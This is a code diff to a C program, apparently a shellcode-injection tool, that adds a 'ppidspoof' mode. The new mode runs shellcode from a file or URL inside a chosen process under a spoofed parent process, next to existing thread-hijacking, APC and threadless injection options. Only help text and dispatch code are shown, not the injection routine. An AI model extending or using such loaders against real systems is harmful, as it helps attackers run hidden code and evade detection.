@@ -13,6 +13,8 @@ int PrintHelp(char* argv0, char* function)
 		printf("[!] Usage: %s %s <local/remote/hijack/earlybird> [ProcessName] [EarlyBirdMethod] [alertable/suspended [AlertableFunction]] <file/URL shellcode>\n", argv0, function);
 	else if (strcmp(function, "threadless") == 0)
 		printf("[!] Usage: %s %s <callback> <file/URL shellcode>\n", argv0, function);
+	else if (strcmp(function, "ppidspoof") == 0)
+		printf("[!] Usage: %s %s <ParentProcessName> <ProcessName> <file/URL shellcode>", argv0, function);
 	else
 	{
 		printf("[!] Usage: %s <Function> <arguments>\n", argv0);
@@ -21,6 +23,7 @@ int PrintHelp(char* argv0, char* function)
 		printf("\t2.>>> \"thread\"\t\t\t\t::: Thread Hijacking\n");
 		printf("\t3.>>> \"apc\"\t\t\t\t::: Apc Injection\n");
 		printf("\t4.>>> \"threadless\"\t\t\t::: Threadless Injection\n");
+		printf("\t5.>>> \"ppidspoof\"\t\t\t::: PPID Spoofing Injection\n");
 	}
 
 	if (strcmp(function, "process") == 0)
@@ -245,6 +248,13 @@ int main(int argc, char *argv[])
 			printf("[!] Invalid threadless method!\n");
 			return PrintHelp(argv[0], argv[1]);
 		}
+	}
+
+	// Injections.exe ppidspoof <ParentProcessName> <ProcessName> <file/URL shellcode>
+	else if (argc == 5 && strcmp(argv[1], "ppidspoof") == 0)
+	{
+		printf("[i] Performing PPID Spoofing execution!\n");
+		PPIDSpoofing(argv[3], argv[2], argv[4]);
 	}
 
 	else
